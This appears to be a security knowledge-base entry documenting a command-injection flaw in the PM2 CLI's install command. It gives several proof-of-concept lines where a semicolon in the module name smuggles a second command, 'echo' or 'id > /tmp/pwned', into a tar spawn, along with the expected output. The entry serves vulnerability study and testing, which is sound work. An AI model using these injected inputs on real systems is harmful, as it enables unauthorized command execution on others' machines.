---
id: uuid-pm2-install-cli
data: ./pm2 install "foo.tar.gz;echo 'HERE'"
tags:
  - exploitation
  - command-injection
type: command
output: >-
  PM2 logs installation attempt, tar error, 'HERE' printed, and PM2 error about
  missing package.json
executor: bash
platforms:
  - Node.js
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:20.556Z'
verified: false
validated: true
submitted: true
---
# pm2-install-cli-injection

## Command

```bash
./pm2 install "foo.tar.gz;echo 'HERE'"
```

## Description

Attempts to install a module via PM2 CLI with a malicious filename injecting an echo command, exploiting tar spawn.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `install` | PM2 command for module installation | Yes |
| `"foo.tar.gz;echo 'HERE'"` | Malicious module name with injection | Yes |

## Examples

### Basic Usage

```bash
./pm2 install "foo.tar.gz;echo 'HERE'"
```

### Advanced Usage

```bash
./pm2 install "payload.tar.gz;id > /tmp/pwned"
```

## Expected Output

Logs: [PM2] Installing..., tar: Error opening archive (no file), HERE echoed, [PM2] Module foo not found (missing package.json).

## Related

- [[procedures/Exploit-PM2-CLI-Command-Injection]]
- [[commands/tar-spawn-sink]]
